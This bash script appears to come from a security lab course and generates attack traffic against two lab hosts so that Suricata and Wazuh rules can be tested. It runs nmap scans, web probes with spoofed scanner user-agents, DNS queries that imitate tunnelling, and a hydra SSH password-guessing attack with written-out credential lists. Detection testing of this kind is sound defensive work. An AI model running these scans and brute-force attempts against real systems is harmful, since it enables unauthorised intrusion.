#!/usr/bin/env bash
# attack-simulation.sh - assignments 8-10 and scenarios 1-3, run on kali01 as root.
# Generates the activity that the IDS (Suricata on monitor01) and SIEM (Wazuh) must detect.
# Targets are lab hosts only: srv01 192.168.20.20 and dmz-web01 192.168.50.10.
set -u
SRV=192.168.20.20; DMZ=192.168.50.10
log() { echo "[$(date -u +%FT%TZ)] $*"; }

log "1 SYN port sweep of srv01 (expect sid 9000001 + ET SCAN)"
nmap -sS -n -T4 -p1-1000 $SRV >/dev/null 2>&1
log "2 NULL and XMAS scans of srv01 (expect sid 9000002 / 9000003)"
nmap -sN -n -T4 -p20-80 $SRV >/dev/null 2>&1
nmap -sX -n -T4 -p20-80 $SRV >/dev/null 2>&1
log "3 web scanner user-agents against both web servers (expect sid 9000040)"
for h in $SRV $DMZ; do
  curl -s -o /dev/null -A "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)" http://$h/
  curl -s -o /dev/null -A "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" http://$h/admin
  curl -s -o /dev/null -A "gobuster/3.6" http://$h/.git/config
done
log "4 suspicious DNS: long random labels like DNS tunnelling (expect sid 9000010) and a query burst (9000011)"
for i in $(seq 1 5); do
  dig +short +tries=1 +time=1 @$SRV "$(head -c 60 /dev/urandom | od -An -tx1 | tr -d ' \n' | cut -c1-50).exfil-test.corp.lab" >/dev/null
done
for i in $(seq 1 150); do dig +short +tries=1 +time=1 @$SRV "host$i.corp.lab" >/dev/null & done; wait
log "5 SSH password guessing against srv01 with invalid and valid user names (expect sid 9000020, Wazuh 5710/5712/5763)"
printf 'admin\nroot\noracle\ntest\nlabadmin\nubuntu\n' > /tmp/users.txt
printf 'password\n123456\nadmin\nletmein\nP@ssw0rd\nwelcome1\n' > /tmp/pass.txt
hydra -L /tmp/users.txt -P /tmp/pass.txt -t 4 -W 1 -f -I ssh://$SRV 2>&1 | grep -E "^\[(DATA|ERROR|STATUS)\]|valid pair|completed" | head -6
log "6 check: is kali01 now blocked by Wazuh active response on srv01?"
nc -z -w3 $SRV 22 && log "   srv01:22 still reachable" || log "   srv01:22 BLOCKED (firewall-drop active response)"
log done
